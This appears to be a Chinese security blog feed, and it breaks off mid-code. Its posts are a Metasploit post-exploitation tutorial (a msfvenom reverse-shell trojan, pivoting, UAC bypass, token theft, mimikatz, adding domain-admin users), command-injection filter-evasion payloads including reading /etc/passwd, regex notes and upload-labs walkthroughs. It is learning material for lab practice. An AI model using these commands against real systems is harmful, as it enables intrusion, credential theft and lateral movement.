-h查看详细用法。</td></tr><tr><td>show</td><td>可以查看msf提供的资源。在根目录下执行的话，由于有些资源模块比较多，需要执行show命令较长的时间。show exploits：查看可以使用的exploit。除了exploits，还支持all，encoders，nops，payloads，auxiliary，post，options。有些选项需要用use使用一个模块后才能使用，show targets。</td></tr><tr><td>search</td><td>搜索模块简单搜索：search ms17_010。多条件搜素缩小范围：search name:mysql type:exploit platform:linux</td></tr><tr><td>info</td><td>查看模块信息info <module name>如果用use使用了一个模块，直接输入info查看。</module></td></tr><tr><td>use</td><td>search找到模块后，用use使用模块use exploit&#x2F;windows&#x2F;smb&#x2F;mso8_067_netapi用use使用一个模块后，可以使用show options查看我们需要配置的选项，使用show targets选择目标主机系统，使用show payload选择payload。</td></tr><tr><td>set&#x2F;setg</td><td>设置参数，比如要渗透的主机ip，payload等 ，我们可以使用show missing查看没有设置的参数。setg是设置全局变量，避免每个模块都要输入相同参数</td></tr><tr><td>unset&#x2F;unsetg</td><td>取消设置参数和取消设置的全局变量</td></tr><tr><td>save</td><td>设置的此参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。</td></tr><tr><td>check</td><td>检查模块是否真的存在这个漏洞，大部分模块没有check功能</td></tr></tbody></table><table><thead><tr><th>back</th><th>返回msfcomsole根目录</th></tr></thead><tbody><tr><td>run&#x2F;exploit</td><td>开始使用模块exploit -j：以后台进行运行</td></tr><tr><td>sessions</td><td>查看当前以建立的sessions，说明已经拿到了shellsessions -i id 可以进入一个session交互</td></tr><tr><td>load&#x2F;unload</td><td>调用外部的扫描命令，比如openvas</td></tr><tr><td>loadpath</td><td>加载自己的模块</td></tr><tr><td>route</td><td>添加一条路由，比如发往某个子网的流量都通过攻陷的机器发送。</td></tr></tbody></table><p>获取到的肉鸡下面运行的命令如下:</p><ul><li><p>run</p><ul><li>get_local_subnets:搜集内网信息</li><li>autoroute -s 内网ip&#x2F;子网掩码长度:将肉鸡添加路由内网的功能<ul><li>-p 查看路由表情况</li></ul></li><li>post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;内网ip&#x2F;子网掩码长度    &#x3D;&#x3D;是RHOSTS不是RHOST&#x3D;&#x3D;:扫描内网</li></ul></li><li><p>portfwd flush:应该是清除设置</p><ul><li><p>portfwd add -L 黑客ip -l 黑客的端口 -p 内网的某些来向端口 -r 内网的某台计算机的ip</p><ul><li><blockquote><p>portfwd add -L 192.168.43.185 -l 2020 -p 80 -r 172.10.10.1</p><p>这句话的意思是将172.10.10.1:80的数据转发到192.168.43.185:2020</p><p>访问192.168.43.185:2020就直接跳转到172.10.10.1:80上面了</p></blockquote></li><li><p><strong>这条命令可以当作给肉鸡添加路由表</strong></p></li></ul></li></ul></li></ul><p>socket代理:承接上面的当我们设置了内网服务器为跳板的时候（metasploit已经进入内网了，需要将他设置为跳板让别的软件也能访问内网）</p><ul><li><p>use auxiliary&#x2F;server&#x2F;socks_proxy：使用代理模块</p></li><li><p>set srvhost 127.0.0.1：设置本机代理</p></li><li><p>set srvport 40004：设置本机端口</p></li><li><p>set version 4a：设置代理版本</p></li><li><p>run：启用代理</p></li><li><p>jobs：查看启动是否成功</p></li><li><p>vim &#x2F;etc&#x2F;proxychains4.conf修改代理文件</p></li><li><p>[ProxyList]下面添加socks4 127.0.0.1 40004(IP 和端口号改成自己的),并且proxy_dns注释掉</p></li><li><p>接下来就可以使用了</p></li><li><p>proxychains 命令</p><ul><li><blockquote><p>例如</p><p>proxychains nmap “<a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a></p></blockquote></li></ul></li></ul><p>netsh进行msf的代理</p><p>假设当前网络为这样</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E5%86%85%E7%BD%91-1.png" alt="image-20220219163859692"></p><p>黑客(kali)                                                           Windows    1                                             Windows 2</p><p>生成一个木马脚本</p><blockquote><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.140 lport&#x3D;4455 -f exe &gt; aaa.exe</p><p>msfconsole</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 192.168.1.186</p><p>set lport 4455</p><p>exploit</p><p>获取之后可以使用background返回上一层</p></blockquote><p>然后在Windows1上面设置</p><blockquote><p>netsh interface portproxy add v4tov4 listenport&#x3D;4455 connectaddress&#x3D;192.168.1.186 connectport&#x3D;4455</p></blockquote><p>设置完成后Windows2上面如果运行了攻击脚本则会获取shell</p><h3 id="uac提权"><a href="#uac提权" class="headerlink" title="uac提权"></a>uac提权</h3><p>控制了肉鸡以后</p><blockquote><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</p><p>set session 1(设置成被控制的那个肉鸡)</p><p>run</p><p>之后要求用户机那边输入用户名和密码</p></blockquote><p>和上面那个一样</p><blockquote><p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p><p>set session 1</p><p>run</p></blockquote><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><blockquote><p>以下的命令是进入控制肉鸡之后输入的</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E5%86%85%E7%BD%91-2.png" alt="image-20220220140740957"></p><p>也就是上面图片的那个模式</p></blockquote><p>use incognito</p><p>list_tokens -u(能看到的令牌数量因权限决定)</p><p>然后会显示类似如下的信息<br><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E5%86%85%E7%BD%91-3.png" alt="image-20220220140421802"></p><p>上面的Delegation Tokens是可以登录的下面的是不可以登录的</p><p>假冒令牌:</p><p>impersonate_token (上面的可登录的用户如:TEST1\\user1)</p><p><strong>题外话</strong></p><p>load mimikatz</p><p>kerberos_ticket_list列出登录信息?</p><p>kerberos_ticket_use</p><p>ps查看进程</p><p>如果有管理员没退出,残留了一些进程我们尝试进入那个进程从而获取他的权限</p><p>操作方法如下:</p><p>migrate PID</p><blockquote><p>当拿到域控管理员的时候我们可以添加一个用户</p><p>add_user 用户名 密码 -h 域控服务器的ip地址</p></blockquote><blockquote><p>添加用户到组从而提权</p><p>add_group_user “domain admins” 用户名 -h 域控制器的ip地址</p></blockquote><p>&#x3D;&#x3D;<strong>下面的命令是Windows中使用的</strong>&#x3D;&#x3D;</p><p>当我们添加完毕之后如果域控的服务器开启着c盘的共享</p><p>我们使用</p><blockquote><p>net use \\域控的ip\c$ “密码” &#x2F;user:用户名</p></blockquote><p>然后就可以访问到目标的c盘了,如果对方开启了135,445端口可是使用如下的命令</p><blockquote><p>net use \\域控的ip\ipc$ “密码” &#x2F;user:用户名</p></blockquote><p>远程访问进程</p><blockquote><p>tasklist &#x2F;S ip &#x2F;U 用户名 &#x2F;P 密码</p></blockquote><p>设置计划任务</p><blockquote><p>at \\ip 时间(例如:9:51PM) cmd.exe “执行命令”</p><p>schtasks &#x2F;create &#x2F;s IP地址 &#x2F;tn test1 &#x2F;sc onstart &#x2F;tr c:&#x2F;a.bat &#x2F;ru system &#x2F;f       (这条命令的意思是运行c下的a.bat)</p></blockquote><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>1.UAC需要用户身份认证的</p><p>2.使用绕过uac提权</p><p>3.寻找操作系统是否有本地溢出的漏洞</p><p>第一种方法</p><blockquote><p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p><p>set filename QQ.exe #设置文件名</p><p>set sessions #查看获取用户的session号</p><p>set session 7</p><p>exploit #当用户点击确定之后便成功</p><p>sessions -i 7</p><p>getsystem</p></blockquote><p>第二种方法</p><p>UAC绕过</p><blockquote><p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</p><p>set sessions</p><p>set session 9</p><p>sessions -i 9</p><p>exploit</p><p>getuid      #查看提权是否成功不成功的话使用getsystem尝试</p></blockquote><p>第三种方法</p><p>查询Windows提权漏洞</p><p>例如ms16_016</p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>进入session之后</p><blockquote><p>run post&#x2F;windows&#x2F;gather&#x2F;checkvm #检查是否是虚拟机</p><p>run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #获取驱动器</p><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_services #查看运行的服务</p><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #列出安装的应用</p><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_share #查看是否存在共享</p><p>run post&#x2F;windows&#x2F;gather&#x2F;dumplinks #搜集内网的其他信息</p><p>run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #查看存在的补丁</p><p>run scraper #自动获取信息(脚本)</p><p>run winenum #获取Windows操作系统的信息(脚本)</p></blockquote><p><strong>数据包获取</strong></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/sniffer.png" alt="image-20220227134412878"></p><blockquote><p>load sniffer #加载sniffer</p><p>help #查看获取的命令</p><p>由于抓取的包会存在内存中而不是放入硬盘所以一般一次只能抓取5万个包,所以要经常来下载包</p><p>使用sniffer_dump来获取信息      sniffer_dump 文件名</p><p>然后使用wireshark来数据包的分析或者使用auxiliary&#x2F;sniffer&#x2F;psnuffle</p><p>使用auxiliary&#x2F;sniffer&#x2F;psnuffle方式来解析</p><p>use auxiliary&#x2F;sniffer&#x2F;psnuffle</p><p>set pcapfile 文件位置</p><p>或者使用packetrecorder 来获取数据包</p><p>在session里 run packetrecorder [参数]</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>tools</tag>
      
      <tag>nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="/2022/01/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/01/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p>有些地方让你使用命令</p><p>使用&amp;,&amp;&amp;,|,||的过滤执行由于;在Linux种会被识别成空所以可以使用&amp;;&amp;</p><p>防止防火墙屏蔽</p><p>可以使用&#39;,\或者使用别的替换命令或是用正则</p><p>下面是例子:</p><blockquote><p>如果他屏蔽了某些词可以使用<code>&#39;</code>比如</p><p>ping 127.0.0.1 | l’s’</p><p>还可以加<code>\</code>来进行绕过</p><p>ping 127.0.0.1 | l\s</p><p>如果屏蔽了cat还可以使用</p><p>tac,head,tail,paste,more,less,nl(显示行号和cat -n类似),sort</p><p>还可以使用来读取文件</p><p>curl file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p><p>屏蔽txt则</p><p>127.0.0.1| c’a’t .&#x2F;123.tx*</p><p>127.0.0.1| c’a’t .&#x2F;123.tx?(正则)</p><p>屏蔽空格用下面的替代</p><p>&lt; &lt;&gt; %20 %09 $IFS$9 ${IFS} $IFS</p><p>echo常和&gt;(写入),&gt;&gt;(追加)命令使用</p><p>echo zxcvasdfgadf&gt;111 echo加-e可以进行特殊字符处理</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript">echo -e 处理特殊字符<br><br>若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出：<br><span class="hljs-string">\a</span> 发出警告声；<br><span class="hljs-string">\b</span> 删除前一个字符；<br><span class="hljs-string">\c</span> 最后不加上换行符号；<br><span class="hljs-string">\f</span> 换行但光标仍旧停留在原来的位置；<br><span class="hljs-string">\n</span> 换行且光标移至行首；<br><span class="hljs-string">\r</span> 光标移至行首，但不换行；<br><span class="hljs-string">\t</span> 插入tab；<br><span class="hljs-string">\v</span> 与<span class="hljs-string">\f相同；</span><br><span class="hljs-string">\</span> 插入<span class="hljs-string">\字符；</span><br><span class="hljs-string">\nnn</span> 插入nnn（八进制）所代表的ASCII字符；<br></code></pre></td></tr></table></figure><p>set &#x2F;p&#x3D;”zxcvasdfavasdf”&gt;111不会换行</p></blockquote><p>读取文件常用命令</p><blockquote><p>查看文件<br>cat 123.txt<br>屏蔽cat tac head tail等命令和’<br>cat：从第一行开始显示内容，显示所有内容<br>tac:和cat相反<br>more:一页页查看内容<br>less：和more类似<br>head:查看头几行<br>tail:查看后几行<br>nl: 类似cat -n,显示行号<br>taillf:类似tail -f</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>安全</tag>
      
      <tag>靶场练习</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计(入门)</title>
    <link href="/2022/01/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%85%A5%E9%97%A8/"/>
    <url>/2022/01/20/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><p>首先，docker和VMware不兼容，我们要相互切换就要使用命令开启或者关闭</p><blockquote><p>1.使用管理员身份打开powershell<br>2.运行命令：<br>bcdedit &#x2F;set hypervisorlaunchtype off（关闭docker）</p><p>如果想重新开启：<br>bcdedit &#x2F;set hypervisorlaunchtype auto(开启docker)</p></blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/Java-%E5%AE%A1%E8%AE%A1-1.png" alt="image-20220205104855807"></p><p>开启Hyper-V(用docker的话),如果要使用VMware的话就要关闭Hyper-V</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2022/01/18/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/01/18/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>正向肯定预查:当你想要匹配后面数据但是不想获取的时候</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-1.png" alt="image-20220118142343936"></p><p>要满足后面的(?&#x3D;\swoca)才能匹配但是(?&#x3D;\swoca)匹配到的数据不会返回</p><p>正向否定预查:当你想要匹配后面的数据但是不想获取的时候</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-2.png" alt="image-20220118143315751"></p><p>反向(look behind)肯定预查:当你想根据A查东西但又不想获取这个A,并且这个根据要放在前面就用这个</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-3.png" alt="image-20220118143447535"></p><p>反向否定预查:当你想要不包含A查东西并且不想包含A就要放这个</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-4.png" alt="image-20220118143543917"></p><p>(?i)大小写不敏感</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-5.png" alt="image-20220118143850414"></p><p>假如我们想要根据A并且&#x3D;&#x3D;不获取A的数据&#x3D;&#x3D;,并且配合B&#x3D;&#x3D;获取B的数据&#x3D;&#x3D;来筛选如下使用</p><table><thead><tr><th></th><th>&#x3D;内容包含</th><th>!内容不包含</th></tr></thead><tbody><tr><td>A要放在B的前面</td><td>?&lt;&#x3D;</td><td>?&lt;!</td></tr><tr><td>A要放在B的后面</td><td>?&#x3D;</td><td>?!</td></tr></tbody></table><p>?有两个意思,一个是匹配0-1次,另一个意思是非贪婪匹配</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-6.png" alt="image-20220118145005011"></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-7.png" alt="image-20220118144943582"></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-8.png" alt="image-20220118154937787"></p><p>正则表达式匹配ip(自己写的!!!)</p><p>我这里最后一个0-255并没有设定结尾符而是采用了从大到小的贪婪匹配</p><blockquote><p>((([0-1]?\d{1,2}).)|(2(5[0-5])|([0-4][0-9])).){3}((2(5[0-5])|([0-4][0-9]))|(([0-1]?\d{1,2})))</p><p>这个不能在python中跑，因为re.findall是用括号进行分段匹配的如果要使用就要进行一些处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">aaa = re.findall(<span class="hljs-string">r&quot;(((([0-1]?\d&#123;1,2&#125;)\.)|(2(50-5)|(0-40-9))\.)&#123;3&#125;((2(50-5)|(0-40-9))|(([0-1]?\d))))&quot;</span>,filet.read(),re.M)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> aaa:<br>    li.append(i[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(li)<br></code></pre></td></tr></table></figure><p>r”\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b”</p><p>而这个可以在python中跑</p></blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E6%AD%A3%E5%88%99-9.png" alt="image-20220118152607223"></p><p>正则与php连用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php">php正则表达式使用<br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$string1</span> = <span class="hljs-string">&quot;haha 123 456 789&quot;</span>;<br><br><span class="hljs-comment">//匹配什么东西</span><br><span class="hljs-variable">$pa</span> = <span class="hljs-string">&#x27;/(\d)/i&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pa</span>, <span class="hljs-string">&quot;xxxx&quot;</span>, <span class="hljs-variable">$string1</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$string1</span> = <span class="hljs-string">&quot;haha 123 456 789&quot;</span>;<br><br><span class="hljs-comment">//匹配什么东西</span><br><span class="hljs-variable">$pa</span> = <span class="hljs-string">&#x27;/(\w+) (\d+) (\d+) (\d+)/i&#x27;</span>;<br><br><span class="hljs-comment">//匹配的替换为什么东西</span><br><span class="hljs-variable">$replace</span> = <span class="hljs-string">&#x27;nihao $&#123;2&#125; $&#123;3&#125;&#x27;</span>;<br><span class="hljs-variable">$replace</span> = <span class="hljs-string">&#x27;nihao &#x27;</span>.$<span class="hljs-number">2</span>.<span class="hljs-string">&#x27; $&#123;3&#125;&#x27;</span>;<br><span class="hljs-variable">$replace</span> = <span class="hljs-string">&#x27;nihao &#x27;</span>.\\<span class="hljs-number">2</span>.<span class="hljs-string">&#x27; $&#123;3&#125;&#x27;</span>;<br><br><br><span class="hljs-comment">//preg_replace(&#x27;/(\w+) (\d+) (\d+) (\d+)/i&#x27;, &#x27;nihao $&#123;2&#125; $&#123;3&#125;&#x27;, &quot;haha 123 456 789&quot;);</span><br><span class="hljs-comment">//                1      2     3     4</span><br><span class="hljs-comment">//               haha   123    456   789</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pa</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$string1</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件上传漏洞</title>
    <link href="/2022/01/17/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/01/17/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-upload-labs"><a href="#PHP-upload-labs" class="headerlink" title="PHP upload labs"></a>PHP upload labs</h1><p>这里用了upload-labs靶场</p><p>第一题没啥好说的,关闭js然后就可以上传了</p><p>第二题</p><p>暂时不看代码首先测试上传1.php</p><p>然后用burp修改1.php为1.PHP3再把content-type:image&#x2F;jpeg—上传成功</p><p>然后我们查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据源码可以发现上传类型要改成image&#x2F;jpeg就可以了</p><p>第三题</p><p>使用PHP3首先进行修改名称来跳过过滤，并且Content-Type: image&#x2F;jpeg</p><p>和第二题差不多</p><p>第四题我们首先尝试了和第三题一样的做法，发现无法上传。然后我们上传<code>.htaccess</code></p><p>发现可以上传并且没有被重命名所以可以尝试图片注入的方式（不过这种上传方式会导致所有图片都没法使用）</p><p><img src="/.com//....%5Cpublic%5Cimg%5Cupload-1.png" alt="image-20220118203922248"></p><p><code>.htaccess</code>的内容如上图</p><p>然后我们再看下源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span 